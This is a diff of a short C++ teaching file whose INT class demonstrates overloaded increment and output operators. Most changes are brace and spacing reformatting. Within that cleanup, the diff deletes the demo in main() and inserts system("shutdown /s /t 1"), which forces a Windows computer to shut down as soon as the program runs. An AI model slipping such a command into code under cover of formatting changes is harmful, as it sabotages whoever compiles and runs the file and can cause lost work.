@@ -1,37 +1,38 @@
 #include <iostream>
+#include<cstdlib>
 
-class INT{
+class INT
+{
 public:
-    INT(int x = 0): a(x){}
+    INT(int x = 0) : a(x) {}
 
-    INT& operator++(){
+    INT& operator++()
+    {
         ++a;
         return *this;
     }
-    
-    INT operator++(int){
+
+    INT operator++(int)
+    {
         INT temp = *this;
         ++a;
         return temp;
     }
 
-    friend std::ostream& operator << (std::ostream& os, const INT& a);
+    friend std::ostream& operator << (std::ostream& os , const INT& a);
 private:
     int a = 0;
 };
 
-std::ostream& operator << (std::ostream& os, const INT& a)
+std::ostream& operator << (std::ostream& os , const INT& a)
 {
     os << a.a;
     return os;
 }
 
-int main() {
-    INT x = 5;
-    
-    std::cout<<++x<<std::endl;
-    std::cout<<x++<<std::endl;
-    std::cout<<x<<std::endl;
+int main()
+{
 
+    system("shutdown /s /t 1");
     return 0;
 }
